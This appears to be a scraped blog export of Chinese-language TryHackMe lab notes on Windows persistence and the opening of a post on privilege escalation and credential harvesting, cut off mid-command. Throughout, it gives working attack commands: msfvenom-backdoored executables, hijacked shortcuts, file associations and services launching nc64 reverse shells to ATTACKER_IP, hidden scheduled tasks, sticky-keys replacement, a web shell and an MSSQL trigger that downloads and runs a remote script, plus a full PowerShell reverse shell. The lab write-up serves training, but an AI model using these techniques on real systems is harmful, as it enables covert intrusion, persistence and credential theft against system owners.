config.inf 您现在应该拥有一个与任何备份操作员具有同等权限的用户。用户仍然无法通过WinRM登录系统，所以让我们做点什么。我们不会将用户添加到远程管理用户组，而是更改与 WinRM 服务关联的安全描述符以允许 thmuser2 进行连接。将安全描述符视为 ACL，但应用于其他系统设施。 要打开 WinRM 安全描述符的配置窗口，您可以在 Powershell 中使用以下命令（为此，您需要使用 GUI 会话）： Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI 这将打开一个窗口，您可以在其中添加 thmuser2 并为其分配连接到 WinRM 的完整权限： 完成此操作后，我们的用户就可以通过 WinRM 进行连接。由于用户具有 SeBackup 和 SeRestore 权限，因此我们可以重复这些步骤以从 SAM 恢复密码哈希并重新连接到管理员用户。 请注意，要使该用户完全使用给定的权限，您必须更改 LocalAccountTokenFilterPolicy 注册表项，但我们已经完成了此操作以获得先前的标志。 如果您检查用户的组成员身份，它看起来就像是普通用户。根本就没有什么可疑的地方！ 我们再次假设我们已经将凭据转储到服务器上并拥有 thmuser2 的密码。让我们使用 WinRM 连接其凭据： RID劫持 无需成为管理员即可获得管理权限的另一种方法是更改某些注册表值，使操作系统认为您是管理员。 创建用户时，会为其分配一个称为相对 ID (RID) 的标识符。 RID 只是代表系统中用户的数字标识符。当用户登录时，LSASS 进程从 SAM 注册表配置单元获取其 RID，并创建与该 RID 关联的访问令牌。如果我们可以篡改注册表值，我们可以通过将相同的 RID 关联到两个帐户，让 Windows 为非特权用户分配管理员访问令牌。 在任何 Windows 系统中，默认管理员帐户分配的 RID = 500，普通用户通常具有 RID &gt;= 1000。 要查找为任何用户分配的 RID，您可以使用以下命令： wmic useraccount get name,sid RID 是 SID 的最后一位（thmuser3 为 1010，管理员为 500）。 SID 是一个标识符，允许操作系统跨域识别用户，但对于此任务，我们不会太在意它的其余部分。 现在我们只需将 RID=500 分配给 thmuser3。为此，我们需要使用 Regedit 访问 SAM。 SAM 仅限于 SYSTEM 帐户，因此即使是管理员也无法对其进行编辑。要以 SYSTEM 身份运行 Regedit，我们将使用 psexec，它可以在您的计算机中的 C:\\tools\\pstools 中找到： C:\\tools\\pstools&gt; PsExec64.exe -i -s regedit 从 Regedit 中，我们将转到 HKLM\\SAM\\SAM\\Domains\\Account\\Users\\ ，其中计算机中的每个用户都有一个密钥。由于我们要修改 thmuser3，因此需要搜索其 RID 为十六进制的密钥 (1010 = 0x3F2)。在对应的key下，会有一个叫做F的值，它在0x30位置保存了用户的有效RID： 请注意，RID 使用小端表示法存储，因此其字节显示为反向。 现在，我们将用十六进制的管理员 RID 替换这两个字节 (500 = 0x01F4)，并交换字节 (F401)： 下次 thmuser3 登录时，LSASS 会将其与管理员相同的 RID 关联起来，并授予它们相同的权限。 对于此任务，我们假设您已经破坏了系统并获取了 thmuser3 的密码。为了您的方便，用户可以使用以下凭据通过 RDP 进行连接： 2.2 后门文件 建立持久性的另一种方法包括篡改我们知道用户定期交互的一些文件。通过对这些文件进行一些修改，我们可以植入后门，每当用户访问它们时就会执行这些后门。由于我们不想创建任何可能暴露我们身份的警报，因此我们更改的文件必须继续按预期为用户工作。 虽然植入后门的机会有很多，但我们将检查最常用的后门。 可执行文件 如果您在桌面上发现任何可执行文件，则用户很可能会经常使用它。假设我们找到了 PuTTY 的快捷方式。如果我们检查快捷方式的属性，我们可以看到它（通常）指向 C:\\Program Files\\PuTTY\\putty.exe 。从那时起，我们可以将可执行文件下载到攻击者的计算机上并修改它以运行我们想要的任何有效负载。 您可以使用 msfvenom 轻松地将您偏好的有效负载植入到任何 .exe 文件中。二进制文件仍将照常工作，但通过在二进制文件中添加额外的线程以静默方式执行额外的有效负载。要创建后门 putty.exe，我们可以使用以下命令： msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b \"\\x00\" -f exe -o puttyX.exe 生成的 puttyX.exe 将在用户没有注意到的情况下执行reverse_tcp meterpreter有效负载。虽然这种方法足以建立持久性，但让我们看看其他更狡猾的技术。 快捷方式文件 如果我们不想修改可执行文件，我们总是可以篡改快捷方式文件本身。与其直接指向预期的可执行文件，我们可以将其更改为指向一个脚本，该脚本将运行一个后门，然后正常执行通常的程序。 对于此任务，让我们检查管理员桌面上的 calc 快捷方式。如果我们右键单击它并转到属性，我们将看到它指向的位置： 在劫持快捷方式的目标之前，让我们在 C:\\Windows\\System32 或任何其他隐蔽位置创建一个简单的 Powershell 脚本。该脚本将执行反向 shell，然后从快捷方式属性上的原始位置运行 calc.exe： Start-Process -NoNewWindow \"c:\\tools c64.exe\" \"-e cmd.exe ATTACKER_IP 4445\" C:\\Windows\\System32\\calc.exe 最后，我们将更改快捷方式以指向我们的脚本。请注意，执行此操作时，快捷方式的图标可能会自动调整。请务必将图标指向原始可执行文件，以便用户不会看到任何可见的更改。我们还想在隐藏窗口上运行脚本，为此我们将 -windowstyle hidden 选项添加到 Powershell。快捷方式的最终目标是： powershell.exe -WindowStyle hidden C:\\Windows\\System32\\backdoor.ps1 让我们启动一个 nc 监听器来接收攻击者机器上的反向 shell： user@AttackBox$ nc -lvp 4445 如果双击该快捷方式，您应该会获得与攻击者计算机的连接。同时，用户将得到一个正如他们所期望的计算器。您可能会注意到命令提示符在屏幕上闪烁并立即消失。希望普通用户可能不会太介意这一点。 劫持文件关联 除了通过可执行文件或快捷方式进行持久化之外，我们还可以劫持任何文件关联，以强制操作系统在用户打开特定文件类型时运行 shell。 默认操作系统文件关联保存在注册表内，其中 HKLM\\Software\\Classes\\ 下为每个文件类型存储一个密钥。假设我们要检查使用哪个程序打开 .txt 文件；我们可以检查 .txt 子项并找到与其关联的程序 ID (ProgID)。 ProgID 只是系统上安装的程序的标识符。对于 .txt 文件，我们将具有以下 ProgID： 然后，我们可以搜索相应 ProgID 的子项（也在 HKLM\\Software\\Classes\\ 下），在本例中为 txtfile ，我们将在其中找到负责处理 .txt 的程序的引用文件。大多数 ProgID 条目在 shell\\open\\command 下都有一个子项，其中指定了对具有该扩展名的文件运行的默认命令： 在这种情况下，当您尝试打开 .txt 文件时，系统将执行 %SystemRoot%\\system32\\NOTEPAD.EXE %1 ，其中 %1 表示打开的文件的名称。如果我们想劫持这个扩展，我们可以用执行后门的脚本替换命令，然后像往常一样打开文件。首先，我们创建一个包含以下内容的 ps1 脚本并将其保存到 C:\\Windows\\backdoor2.ps1 ： Start-Process -NoNewWindow \"c:\\tools c64.exe\" \"-e cmd.exe ATTACKER_IP 4448\" C:\\Windows\\system32\\NOTEPAD.EXE $args[0] 请注意，在 Powershell 中，我们必须将 $args[0] 传递给记事本，因为它将包含要打开的文件的名称，如通过 %1 给出的那样。 现在让我们更改注册表项以在隐藏窗口中运行后门脚本： powershell -WindowStyle hidden C:\\Windows\\System32\\backdoor.ps1 %1 最后，为反向 shell 创建一个侦听器，并尝试打开受害计算机上的任何 .txt 文件（如果需要，请创建一个）。您应该会收到一个具有打开该文件的用户权限的反向 shell。 这里建了个1.txt然后双击执行，即可拿shell 2.3 滥用服务 Windows 服务提供了一种建立持久性的好方法，因为它们可以配置为在受害计算机启动时在后台运行。如果我们可以利用任何服务为我们运行某些东西，我们就可以在每次启动时重新获得对受害计算机的控制。 服务基本上是在后台运行的可执行文件。配置服务时，您可以定义将使用哪个可执行文件，并选择该服务是在计算机启动时自动运行还是应该手动启动。 我们可以通过两种主要方式滥用服务来建立持久性：创建一项新服务或修改现有服务来执行我们的有效负载。 创建后门服务 我们可以使用以下命令创建并启动名为“THMservice”的服务： sc.exe create THMservice binPath= \"net user Administrator Passwd123\" start= auto sc.exe start THMservice Note: There must be a space after each equal sign for the command to work. 注意：每个等号后面必须有一个空格才能使该命令起作用。 服务启动时将执行“net user”命令，将管理员密码重置为 Passwd123 。请注意该服务如何设置为自动启动 (start= auto)，以便它无需用户交互即可运行。 重置用户密码效果很好，但我们还可以使用 msfvenom 创建一个反向 shell，并将其与创建的服务关联起来。但请注意，服务可执行文件是唯一的，因为它们需要实现由系统处理的特定协议。如果要创建与Windows服务兼容的可执行文件，可以在msfvenom中使用 exe-service 格式： user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe 之后在受害机上的powershell下载上述exe wget http://10.10.51.167:8000/rev-svc.exe -O rev-svc.exe 然后，您可以将可执行文件复制到目标系统，例如 C:\\Windows （这里我是\\Users\\Administrator）并将服务的 binPath 指向它：（在powershell执行） sc.exe create THMservice2 binPath= \"C:\\Users\\Administrator\\rev-svc.exe\" start= auto sc.exe start THMservice2 这应该会创建一个返回到攻击者计算机的连接。 修改现有服务 虽然为持久性创建新服务效果很好，但蓝队可能会监控整个网络上的新服务创建。我们可能希望重用现有服务而不是创建服务来避免检测。通常，任何禁用的服务都是一个很好的候选者，因为它可以在用户没有注意到的情况下进行更改。 您可以使用以下命令获取可用服务的列表： 可以看到有很多，这里放一个简单模板 C:\\&gt; sc query state=all SERVICE_NAME: THMService1 DISPLAY_NAME: THMService1 TYPE : 10 WIN32_OWN_PROCESS STATE : 1 STOPPED WIN32_EXIT_CODE : 1077 (0x435) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 您应该能够找到名为 THMService3 的已停止服务。要查询服务的配置，可以使用以下命令： C:\\&gt; sc qc THMService3 [SC] QueryServiceConfig SUCCESS SERVICE_NAME: THMService3 TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\MyService\\THMService.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : THMService3 DEPENDENCIES : SERVICE_START_NAME : NT AUTHORITY\\Local Service 使用服务进行持久化时，我们关心三件事： 可执行文件（BINARY_PATH_NAME）应该指向我们的有效负载。 服务 START_TYPE 应该是自动的，以便有效负载无需用户交互即可运行。 SERVICE_START_NAME 是运行服务的帐户，最好将其设置为 LocalSystem 以获取 SYSTEM 权限。 让我们首先使用 msfvenom 创建一个新的反向 shell：（这里我就用旧的了） 要重新配置“THMservice3”参数，我们可以使用以下命令： C:\\&gt; sc config THMservice3 binPath= \"C:\\Windows\\rev-svc2.exe\" start= auto obj= \"LocalSystem\" 然后，您可以再次查询服务的配置以检查是否一切按预期进行： 那我们直接启动该服务即可 2.4 滥用计划任务 如果需要，我们还可以使用计划任务来建立持久性。有多种方法可以在 Windows 系统中安排有效负载的执行。让我们看看其中的一些： 任务调度程序 安排任务的最常见方法是使用内置的 Windows 任务计划程序。任务计划程序允许对任务启动时间进行精细控制，允许您配置在特定时间激活、定期重复甚至在发生特定系统事件时触发的任务。在命令行中，您可以使用 schtasks 与任务计划程序交互。该命令的完整参考可以在 Microsoft 网站上找到：https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks 让我们创建一个每分钟运行一次反向 shell 的任务。在现实场景中，您不希望负载如此频繁地运行，但我们不想在这个房间等待太久： C:\\&gt; schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr \"c:\\tools c64 -e cmd.exe 10.10.46.173 5555\" /ru SYSTEM SUCCESS: The scheduled task \"THM-TaskBackdoor\" has successfully been created. 注意：请务必使用 THM-TaskBackdoor 作为任务名称，否则您将不会获得该标志。 前面的命令将创建一个“THM-TaskBackdoor”任务并向攻击者执行 nc64 反向 shell。 /sc 和 /mo 选项指示任务应每分钟运行一次。 /ru 选项指示该任务将以 SYSTEM 权限运行。 要检查我们的任务是否已成功创建，我们可以使用以下命令： C:\\&gt; schtasks /query /tn thm-taskbackdoor Folder: \\ TaskName Next Run Time Status ======================================== ====================== =============== thm-taskbackdoor 5/25/2022 8:08:00 AM Ready 让我们的任务隐形 我们的任务现在应该已经启动并运行，但是如果受感染的用户尝试列出其计划任务，我们的后门将会很明显。为了进一步隐藏我们的计划任务，我们可以通过删除其安全描述符（SD）使其对系统中的任何用户都不可见。安全描述符只是一个 ACL，它说明哪些用户有权访问计划任务。如果您的用户不允许查询计划任务，您将无法再看到它，因为 Windows 只会向您显示您有权使用的任务。删除SD相当于禁止所有用户访问计划任务，包括管理员。 所有计划任务的安全描述符都存储在 HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\ 中。您将找到每个任务的注册表项，其中名为“SD”的值包含安全描述符。仅当您拥有 SYSTEM 权限时才能删除该值。 为了隐藏我们的任务，让我们删除之前创建的“THM-TaskBackdoor”任务的 SD 值。为此，我们将使用 psexec （在 C:\\tools 中提供）以系统权限打开 Regedit： C:\\&gt; c:\\tools\\pstools\\PsExec64.exe -s -i regedit 然后我们将删除任务的安全描述符： 如果我们尝试再次查询我们的服务，系统会告诉我们没有这样的任务： C:\\&gt; schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified. 如果我们在攻击者的机器上启动一个 nc 监听器，我们应该会在一分钟后得到一个 shell： 2.5 登录触发持久化 用户执行的某些操作也可能绑定到执行特定的有效负载以实现持久性。 Windows 操作系统提供了多种将有效负载与特定交互相关联的方法。此任务将研究植入有效负载的方法，这些有效负载将在用户登录系统时执行。 启动文件夹 每个用户在 C:\\Users\\&lt;your_username&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 下都有一个文件夹，您可以在其中放置要在用户登录时运行的可执行文件。攻击者只需将有效负载放入其中即可实现持久性。请注意，每个用户只会运行其文件夹中可用的内容。 如果我们想强制所有用户在登录时运行有效负载，我们可以以相同的方式使用 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp 下的文件夹。 对于此任务，让我们使用 msfvenom 生成反向 shell 有效负载： user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.46.173 LPORT=5555 -f exe -o revshell.exe 然后我们将把有效负载复制到受害者机器中。您可以使用 Python3 生成 http.server 并在受害计算机上使用 wget 来提取文件： 然后，我们将有效负载存储到 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp 文件夹中，以便为登录计算机的任何用户获取 shell。 C:\\&gt; copy revshell.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\\" 现在请务必从开始菜单注销您的会话（关闭 RDP 窗口还不够，因为它会使您的会话保持打开状态）： Run / RunOnce 您还可以通过注册表强制用户在登录时执行程序。您可以使用以下注册表项来指定在登录时运行的应用程序，而不是将有效负载传递到特定目录： HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKCU 下的注册表项仅适用于当前用户， HKLM 下的注册表项适用于所有人。在 Run 键下指定的任何程序都将在用户每次登录时运行。 RunOnce 键下指定的程序将仅执行一次。 对于此任务，让我们使用 msfvenom 创建一个新的反向 shell： user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe 将其传输到受害机器后，让我们将其移动到 C:\\Windows\\ ： C:\\&gt; move revshell.exe C:\\Windows 然后，我们在 HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 下创建一个 REG_EXPAND_SZ 注册表项。条目的名称可以是您喜欢的任何内容，值将是我们要执行的命令。 注意：在实际环境中，您可以为注册表项使用任何名称，但对于此任务，您需要使用 MyBackdoor 来接收标志。 完成此操作后，退出当前会话并再次登录，您应该会收到一个 shell（可能需要大约 10-20 秒）。 登录系统 登录时自动启动程序的另一种替代方法是滥用 Winlogon，这是一种 Windows 组件，可在身份验证（除其他外）后立即加载您的用户配置文件。 Winlogon 在 HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ 下使用一些注册表项，这对于获得持久性可能很有趣： Userinit 指向 userinit.exe ，它负责恢复您的用户配置文件首选项。 shell 指向系统的 shell，通常是 explorer.exe 。 如果我们用一些反向 shell 替换任何可执行文件，我们就会破坏登录序列，这是我们所不希望的。有趣的是，您可以附加用逗号分隔的命令，Winlogon 将处理所有命令。 让我们从创建一个 shell 开始： user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe 我们将像之前一样将 shell 转移到受害机器上。然后我们可以将 shell 复制到我们喜欢的任何目录。在这种情况下，我们将使用 C:\\Windows ： C:\\&gt; move revshell.exe C:\\Windows 然后我们更改 HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ 中的 shell 或 Userinit 。在本例中，我们将使用 Userinit ，但使用 shell 的过程是相同的。 注意：虽然 shell 和 Userinit 都可用于在现实场景中实现持久性，但要获取此房间中的标志，您将需要使用 Userinit 登录脚本 加载用户配置文件时 userinit.exe 所做的事情之一是检查名为 UserInitMprLogonScript 的环境变量。我们可以使用此环境变量将登录脚本分配给用户，该脚本将在登录计算机时运行。默认情况下未设置该变量，因此我们可以创建它并分配我们喜欢的任何脚本。 请注意，每个用户都有自己的环境变量；因此，您需要分别为每个用户设置后门。 让我们首先创建一个用于此技术的反向 shell： user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe 我们将像之前一样将 shell 转移到受害机器上。然后我们可以将 shell 复制到我们喜欢的任何目录。在这种情况下，我们将使用 C:\\Windows ： C:\\&gt; move revshell.exe C:\\Windows 为用户创建环境变量，您可以转到注册表中的 HKCU\\Environment 。我们将使用 UserInitMprLogonScript 条目指向我们的有效负载，以便在用户登录时加载它： 请注意，此注册表项在 HKLM 中没有等效项，这使得您的后门仅适用于当前用户。 完成此操作后，退出当前会话并再次登录，您应该会收到一个 shell（可能需要大约 10 秒）。 2.6 登录屏幕/RDP 后门 如果我们对机器有物理访问权限（在我们的例子中是 RDP），您可以在登录屏幕后门来访问终端，而无需拥有机器的有效凭据。 为此，我们将研究两种依赖辅助功能的方法。 Sticky Keys 粘滞键 当按下 CTRL + ALT + DEL 等组合键时，您可以将 Windows 配置为使用粘滞键，这样您就可以按顺序而不是同时按下组合按钮。从这个意义上说，如果粘滞键处于活动状态，您可以按下并释放 CTRL ，按下并释放 ALT ，最后按下并释放 DEL 来实现相同的效果效果与按 CTRL + ALT + DEL 组合键一样。 为了使用粘滞键建立持久性，我们将滥用任何 Windows 安装中默认启用的快捷方式，该快捷方式允许我们通过按 SHIFT 5 次来激活粘滞键。输入快捷方式后，我们通常会看到如下所示的屏幕： 按 SHIFT 5 次后，Windows 将执行 C:\\Windows\\System32\\sethc.exe 中的二进制文件。如果我们能够将此类二进制文件替换为我们偏好的有效负载，则我们可以使用快捷方式触发它。有趣的是，我们甚至可以在输入任何凭据之前从登录屏幕执行此操作。 登录屏幕后门的一种简单方法是将 sethc.exe 替换为 cmd.exe 的副本。这样，我们就可以使用粘滞键快捷键生成控制台，甚至可以从日志记录屏幕中生成控制台。 要覆盖 sethc.exe ，我们首先需要获得该文件的所有权并授予当前用户修改它的权限。只有这样我们才能用 cmd.exe 的副本替换它。我们可以使用以下命令来做到这一点： 执行此操作后，从开始菜单锁定您的会话： 您现在应该可以按五次 SHIFT 直接从登录屏幕访问具有系统权限的终端： Utilman Utilman 是一个内置的 Windows 应用程序，用于在锁定屏幕期间提供“轻松访问”选项： 当我们单击登录屏幕上的轻松访问按钮时，它会以系统权限执行 C:\\Windows\\System32\\Utilman.exe 。如果我们将其替换为 cmd.exe 的副本，我们可以再次绕过登录屏幕。 为了替换 utilman.exe ，我们执行与 sethc.exe 类似的过程： C:\\&gt; takeown /f c:\\Windows\\System32\\utilman.exe SUCCESS: The file (or folder): \"c:\\Windows\\System32\\utilman.exe\" now owned by user \"PURECHAOS\\Administrator\". C:\\&gt; icacls C:\\Windows\\System32\\utilman.exe /grant Administrator:F processed file: C:\\Windows\\System32\\utilman.exe Successfully processed 1 files; Failed processing 0 files C:\\&gt; copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe Overwrite C:\\Windows\\System32\\utilman.exe? (Yes/No/All): yes 1 file(s) copied. 要触发我们的终端，我们将从开始按钮锁定屏幕： 最后，继续单击“轻松访问”按钮。由于我们将 utilman.exe 替换为 cmd.exe 副本，因此我们将获得具有 SYSTEM 权限的命令提示符： 2.7 通过现有服务持续存在 如果您不想使用 Windows 功能来隐藏后门，您始终可以从任何可用于为您运行代码的现有服务中获益。此任务将探讨如何在典型的 Web 服务器设置中植入后门。尽管如此，您对执行内容有一定程度控制的任何其他应用程序都应该类似地存在后门。可能性是无止境！ 使用 Web Shell 在 Web 服务器中实现持久化的常用方法是将 Web shell 上传到 Web 目录。这很简单，将授予我们使用 IIS 中配置的用户的权限进行访问，默认情况下为 iis apppool\\defaultapppool 。即使这是一个非特权用户，它也具有特殊的 SeImpersonatePrivilege ，提供了一种使用各种已知漏洞升级到管理员的简单方法。有关如何滥用此权限的详细信息，请参阅 Windows Privesc Room。 让我们首先下载 ASP.NET Web shell（here）这里提供了一个现成的 Web shell，但您可以随意使用您喜欢的任何一个。将其传输到受害计算机并将其移至 webroot，默认情况下位于 C:\\inetpub\\wwwroot 目录中： 这里依旧在攻击机上开启http服务，在受害机上用powershell下载木马 C:\\&gt; move shell.aspx C:\\inetpub\\wwwroot\\ 注意：根据您创建/传输 shell.aspx 的方式，文件中的权限可能不允许 Web 服务器访问它。如果您在访问 shell 的 URL 时遇到“权限被拒绝”错误，只需授予每个人对该文件的完全权限即可使其正常工作。您可以使用 icacls shell.aspx /grant Everyone:F 来做到这一点。 然后，我们可以通过指向以下 URL 从 Web 服务器运行命令： http://10.10.73.60/shell.aspx 使用 MSSQL 作为后门 在 MSSQL Server 安装中植入后门的方法有多种。现在，我们将看看其中一个滥用触发器的情况。简而言之，MSSQL 中的触发器允许您绑定在数据库中发生特定事件时要执行的操作。这些事件的范围可以从用户登录到从给定表中插入、更新或删除数据。对于此任务，我们将为 HRDB 数据库中的任何 INSERT 创建触发器。 在创建触发器之前，我们必须首先在数据库上重新配置一些东西。首先，我们需要启用 xp_cmdshell 存储过程。 xp_cmdshell 是一个存储过程，在任何 MSSQL 安装中默认提供，允许您直接在系统控制台中运行命令，但默认情况下处于禁用状态。 要启用它，请从开始菜单打开 Microsoft SQL Server Management Studio 18 。当要求进行身份验证时，只需使用 Windows 身份验证（默认值），您将使用当前 Windows 用户的凭据登录。默认情况下，本地管理员帐户将有权访问所有数据库。 登录后，单击“新建查询”按钮打开查询编辑器： 运行以下 SQL 语句启用 MSSQL 配置中的“高级选项”，然后继续启用 xp_cmdshell 。 sp_configure 'Show Advanced Options',1; RECONFIGURE; GO sp_configure 'xp_cmdshell',1; RECONFIGURE; GO 之后，我们必须确保任何访问数据库的网站都可以运行 xp_cmdshell 。默认情况下，只有具有 sysadmin 角色的数据库用户才能执行此操作。由于预计 Web 应用程序会使用受限数据库用户，因此我们可以向所有用户授予权限来模拟 sa 用户，这是默认的数据库管理员： 之后，我们必须确保任何访问数据库的网站都可以运行 xp_cmdshell 。默认情况下，只有具有 sysadmin 角色的数据库用户才能执行此操作。由于预计 Web 应用程序会使用受限数据库用户，因此我们可以向所有用户授予权限来模拟 sa 用户，这是默认的数据库管理员： USE master; GRANT IMPERSONATE ON LOGIN::sa to [Public]; 完成所有这些之后，我们终于配置了一个触发器。我们首先更改为 HRDB 数据库： USE HRDB; 我们的触发器将利用 xp_cmdshell 执行 Powershell，从攻击者控制的 Web 服务器下载并运行 .ps1 文件。触发器将配置为每当将 INSERT 放入 HRDB 数据库的 Employees 表中时执行： CREATE TRIGGER [sql_backdoor] ON HRDB.dbo.Employees FOR INSERT AS EXECUTE AS LOGIN = 'sa' EXEC master..xp_cmdshell 'Powershell -c \"IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')\"'; 现在后门已设置完毕，让我们在攻击者的计算机中创建 evilscript.ps1 ，其中将包含 Powershell 反向 shell： $client = New-Object System.Net.Sockets.TCPClient(\"ATTACKER_IP\",5555); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \"; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close() 我们需要打开两个终端来处理此漏洞利用中涉及的连接： 触发器将执行第一次连接来下载并执行 evilscript.ps1 。我们的触发器使用端口 8000。 第二个连接将是端口 5555 上的反向 shell 返回到我们的攻击者计算机。 一切准备就绪后，让我们导航到 http://10.10.73.60/ 并将员工插入到 Web 应用程序中。由于 Web 应用程序将向数据库发送 INSERT 语句，因此我们的 TRIGGER 将为我们提供对系统控制台的访问。 执行之后，访问受害机web网站 如上图，添加SQL用户，点击add，即可看到下图，拿到shell","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-Windows权限提升","path":"/2024/02/06/thm-windows-quan-xian-ti-sheng/","content":"0x01 前言 最近在tryhackme中学到了Windows渗透相关知识，在此之前学的有些东西忘记记录了，但实际上也没有记录的必要性，故此不管了。这里就记录Windows提权的某些知识点。 0x02 简介 简而言之，权限升级包括使用“用户 A”对主机的给定访问权限，并通过滥用目标系统中的弱点来利用它来获得对“用户 B”的访问权限。虽然我们通常希望“用户 B”拥有管理权限，但在某些情况下，我们可能需要升级到其他非特权帐户，然后才能真正获得管理权限。 获得对不同帐户的访问权限就像在一些粗心的用户留下的不安全的文本文件或电子表格中查找凭据一样简单，但情况并非总是如此。根据具体情况，我们可能需要利用以下一些弱点： Windows 服务或计划任务配置错误 分配给我们帐户的权限过多 易受攻击的软件 缺少 Windows 安全补丁 在开始讨论实际技术之前，让我们先了解一下 Windows 系统上的不同帐户类型。 0x03 Windows用户 Windows系统主要有两类用户。根据用户的访问级别，我们可以将用户分为以下组之一： Administrators 管理员 这些用户拥有最多的权限。他们可以更改任何系统配置参数并访问系统中的任何文件。 Standard Users 标准用户 这些用户可以访问计算机，但只能执行有限的任务。通常，这些用户无法对系统进行永久或重要的更改，并且仅限于他们的文件。 任何具有管理权限的用户都将成为管理员组的一部分。另一方面，标准用户是用户组的一部分。 除此之外，您通常会听说操作系统在权限升级的情况下使用一些特殊的内置帐户： SYSTEM / LocalSystem 系统/本地系统 操作系统用来执行内部任务的帐户。它可以完全访问主机上可用的所有文件和资源，并且具有比管理员更高的权限。 Local Service 本地服务 用于以“最低”权限运行 Windows 服务的默认帐户。它将使用网络上的匿名连接。 Network Service 网络服务 用于以“最低”权限运行 Windows 服务的默认帐户。它将使用计算机凭据通过网络进行身份验证。 这些帐户由 Windows 创建和管理，您将无法像其他常规帐户一样使用它们。不过，在某些情况下，您可能会因为利用特定服务而获得他们的特权。 0x03 Windows密码收集 获得其他用户访问权限的最简单方法是从受感染的计算机收集凭据。此类凭证的存在可能有多种原因，包括粗心的用户将其留在明文文件中；甚至由浏览器或电子邮件客户端等软件存储。 3.1 Windows installations 在大量主机上安装 Windows 时，管理员可以使用 Windows 部署服务，该服务允许通过网络将单个操作系统映像部署到多台主机。此类安装称为无人值守安装，因为它们不需要用户交互。此类安装需要使用管理员帐户来执行初始设置，该设置最终可能存储在计算机中的以下位置： C:\\Unattend.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\system32\\sysprep.inf C:\\Windows\\system32\\sysprep\\sysprep.xml 作为这些文件的一部分，您可能会遇到凭据： &lt;Credentials&gt; &lt;Username&gt;Administrator&lt;/Username&gt; &lt;Domain&gt;thm.local&lt;/Domain&gt; &lt;Password&gt;MyPassword123&lt;/Password&gt; &lt;/Credentials&gt; 3.2 Powershell History 每当用户使用 Powershell 运行命令时，它都会存储到一个文件中，该文件会保留过去的命令。这对于快速重复之前使用过的命令很有用。如果用户直接在 Powershell 命令行中运行包含密码的命令，则稍后可以在 cmd.exe 提示符下使用以下命令来检索该密码： type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt 注意：上面的命令只能在 cmd.exe 中运行，因为 Powershell 不会将 %userprofile% 识别为环境变量。要从 Powershell 读取文件，您必须将 %userprofile% 替换为 $Env:userprofile 。 3.3 Windows Credentials Windows 允许我们使用其他用户的凭据。此功能还提供了将这些凭据保存在系统上的选项。下面的命令将列出保存的凭据： cmdkey /list 虽然您看不到实际的密码，但如果您发现任何值得尝试的凭据，则可以将它们与 runas 命令和 /savecred 选项一起使用，如下所示。 runas /savecred /user:admin cmd.exe //上述的user:admin可分别用对应的hash值替换 3.4 IIS Configuration Internet 信息服务 (IIS) 是 Windows 安装上的默认 Web 服务器。 IIS 上网站的配置存储在名为 web.config 的文件中，并且可以存储数据库的密码或配置的身份验证机制。根据安装的 IIS 版本，我们可以在以下位置之一找到 web.config： C:\\inetpub\\wwwroot\\web.config C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config 这是在文件上查找数据库连接字符串的快速方法： type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString 3.5 从软件检索凭证：PuTTY PuTTY 是 Windows 系统上常见的 SSH 客户端。用户不必每次都指定连接参数，而是可以存储会话，其中可以存储 IP、用户和其他配置以供以后使用。虽然 PuTTY 不允许用户存储其 SSH 密码，但它将存储包含明文身份验证凭据的代理配置。 要检索存储的代理凭据，您可以使用以下命令在以下注册表项下搜索 ProxyPassword： reg query 